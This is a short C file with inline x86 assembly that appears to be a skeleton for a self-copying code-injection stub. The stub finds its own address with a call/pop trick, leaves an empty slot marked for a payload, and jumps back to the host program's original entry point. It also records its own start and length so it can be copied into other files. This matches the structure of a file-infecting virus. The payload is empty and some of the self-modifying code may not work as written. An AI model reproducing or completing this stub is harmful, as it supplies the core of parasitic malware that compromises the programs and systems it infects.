#include <stdint.h>

#define GET_PARAM_(f) PARAM_ ## f : mov eax, 1337; 

uint8_t* payLoad;
uint32_t payLoad_length;
int32_t SelfCopyingFunction(uint32_t param1 /*access via GET_PARAM_(1)*/)
{
	_asm
	{
		jmp end;
start:
		GET_PARAM_(1)		;
		mov ebx, eax		;
		call foo
foo:
		pop eax				;	get adress of foo
		mov ecx, foo		;
		sub ecx, start		;		
		sub eax, ecx		;	calc addr of start
		sub eax, ebx		;	calc addr of original entry point

		;;;;;;;;;;;;;
		;payload here

		;;;;;;;;;;;;;
		jmp eax				

end:
		// calc payload length
		mov eax, end;
		sub eax, start;
		mov payLoad_length, eax;
		mov eax, start;
		mov payLoad, eax;

		// PRE PROCESSOR LOOP:
		mov eax, param1;
		mov PARAM_1+1, eax;



	};
}